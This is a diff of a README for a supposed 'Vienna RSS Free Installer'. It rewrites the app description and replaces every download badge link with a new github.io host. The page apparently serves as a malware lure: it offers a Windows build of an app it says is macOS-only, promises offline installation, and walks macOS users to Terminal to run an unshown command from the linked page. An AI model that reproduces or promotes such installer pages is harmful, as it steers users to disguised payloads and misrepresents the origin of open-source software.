@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-RSS+Reader-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Vienna RSS Free Installer** — Vienna RSS is a free, open-source RSS and Atom feed reader for macOS with a three-panel interface and offline reading. Works without internet access, no account required. Full offline installation.
+**💻 Vienna RSS Free Installer** — Vienna is a free, open-source RSS and Atom news reader for macOS with a clean three-column interface, smart folders, built-in browser, and offline reading support. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Vienna RSS](https://img.shields.io/badge/⬇_Install_Vienna+RSS-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Vienna RSS](https://img.shields.io/badge/⬇_Install_Vienna+RSS-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Vienna RSS
 
-Vienna RSS is a free, open-source RSS and Atom feed reader for macOS with a three-panel interface and offline reading. Subscribe to feeds, organize them into folders, search article content, and apply smart folders for filtered views. Vienna's native macOS design, no subscription requirement, and open-source nature make it a straightforward choice for Mac users following online publications via RSS.
+Vienna is a free, open-source RSS and Atom news reader for macOS with a clean three-column interface, smart folders, built-in browser, and offline reading support. A long-standing free alternative to paid RSS readers for macOS users.
 
 ---
 
 ## ❌ Problem: Vienna RSS is hard to access
 
-- **macOS Only** — No Windows or cross-platform version
-- **Sync Limitations** — No built-in cloud sync; feeds stored locally only
-- **Development Pace** — Community-driven development with variable update frequency
-- **Modern Feature Gap** — Some newer RSS reader features not implemented
+- **macOS Only** — No Windows, Linux, or iOS version
+- **No Cloud Sync** — RSS subscriptions stored locally; no sync across devices
+- **Development Pace** — Community-maintained with infrequent updates
+- **Basic Feature Set** — Missing advanced features of commercial RSS readers
 
 ---
 
@@ -61,9 +61,9 @@ Vienna RSS is a free, open-source RSS and Atom feed reader for macOS with a thre
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Vienna RSS is a free, open-source RSS and Atom feed reader for macOS with a thre
 
 <div align="center">
 
-[![⬇ Install Vienna RSS](https://img.shields.io/badge/⬇_Install_Vienna+RSS-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Vienna RSS](https://img.shields.io/badge/⬇_Install_Vienna+RSS-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Vienna RSS is a free, open-source RSS and Atom feed reader for macOS with a thre
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Vienna RSS is a free, open-source RSS and Atom feed reader for macOS with a thre
 
 ---
 
-**Vienna RSS Free Installer** — Vienna RSS is a free, open-source RSS and Atom feed reader for macOS with a three-panel interface and offline reading. Install without internet connection today!
+**Vienna RSS Free Installer** — Vienna is a free, open-source RSS and Atom news reader for macOS with a clean three-column interface, smart folders, built-in browser, and offline reading support. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Vienna RSS](https://img.shields.io/badge/⬇_Install_Vienna+RSS-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Vienna RSS](https://img.shields.io/badge/⬇_Install_Vienna+RSS-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
